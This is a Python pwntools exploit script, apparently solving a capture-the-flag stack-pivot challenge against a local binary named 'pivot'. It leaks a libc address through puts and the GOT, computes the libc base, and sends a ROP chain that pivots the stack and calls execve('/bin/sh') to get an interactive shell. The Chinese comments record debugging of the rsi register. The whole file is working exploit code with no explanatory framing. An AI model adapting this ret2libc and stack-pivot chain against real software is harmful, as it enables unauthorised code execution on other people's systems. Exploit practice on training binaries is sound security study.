from pwn import *
import sys

#sys.setrecursionlimit(10000000)


io = process("./pivot")
elf = ELF("./pivot")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#gdb.attach(io)

io.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
pivot_addr = io.recvuntil("\n", drop = True)
print("pivot_addr = ", pivot_addr)
pivot_addr = int(pivot_addr, 16)
print("pivot_addr = ", hex(pivot_addr))

io.recvuntil("> ")

main_addr = 0x400847
pop_rdi_ret = 0x0000000000400a33 
leave_ret = 0x00000000004008ef

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

payload1 = p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendline(payload1)
io.recvuntil("> ")


payload2 = b'a'*0x20 + p64(pivot_addr) + p64(leave_ret)
io.sendline(payload2)
io.recvuntil("Thank you!\n")

puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
print(hex(libc_base))
sys_addr = libc_base + libc.sym["execve"]
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

io.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
pivot_addr = io.recvuntil("\n", drop = True)
print("pivot_addr = ", pivot_addr)
pivot_addr = int(pivot_addr, 16)
print("pivot_addr = ", hex(pivot_addr))

io.recvuntil("> ")
'''
#这里直接调用system("/bin/sh")失败，下面考虑ret2shellcode
payload3 = p64(0) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)
io.sendline(payload3)
'''

#原因找到：是rsi寄存器的值不对导致了错误
pop_rax_ret = 0x00000000004009bb
pop_rsi_r15_ret = 0x0000000000400a31

payload3  = p64(0) 
payload3 += p64(pop_rax_ret) + p64(59)
payload3 += p64(pop_rdi_ret) + p64(binsh_addr)
payload3 += p64(pop_rsi_r15_ret) + p64(0)*2
payload3 += p64(sys_addr)
io.sendline(payload3)

io.recvuntil("> ")

payload4 = b'a'*0x20 + p64(pivot_addr) + p64(leave_ret) 
io.sendline(payload4)

io.interactive()


